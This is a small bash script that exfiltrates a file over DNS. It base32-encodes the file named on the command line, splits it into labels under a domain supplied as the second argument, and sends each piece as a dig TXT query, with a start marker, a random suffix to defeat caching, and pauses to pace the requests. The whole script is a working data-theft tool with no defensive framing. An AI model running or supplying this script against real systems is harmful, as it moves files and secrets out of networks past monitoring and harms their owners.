#!/bin/bash

# Check for dependancies
# Dont actually expect any of these to be missing 
# maybe on barebones machines running containers
if ! which base32 &> /dev/null ; then
	echo "Missing base32" 
fi 
if ! which tr &> /dev/null ; then
	echo "Missing tr" 
fi 
if ! which cat &> /dev/null ; then
	echo "Missing cat" 
fi 
if ! which sed &> /dev/null ; then
	echo "Missing sed" 
fi 

if ! [ $2 ]; then 
	echo "This script takes two args: filename and domain name" 
fi

# Generate a random string to make sure the domains wont be cached 
filesuffix=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1) 
domain=$2
index=0
output=$(cat $1 | base32 -w 63 | tr '[:upper:]' '[:lower:]' | sed "s/\$/.NUM.$filesuffix.$domain/")
linestot=$(echo "$output" | wc -l) 
echo "This file will take $linestot dns requests" 

# Starting file request 
echo "start-$linestot.$filesuffix.$domain"
dig "start-$linestot.000.$filesuffix.$domain" @localhost TXT &> /dev/null 

while read -r line ; do 
	line=$(echo -n "$line" | sed "s/NUM/$index/")
	index=$(( $index + 1 ))
	if ! (( $index % 50 )) ; then
		sleep 1 # some breathing room every 50 requests, may need adjusting
	fi 
	echo "$line"
	dig $line @localhost TXT &> /dev/null & 
	# dig $line TXT
done <<< $(echo "$output")
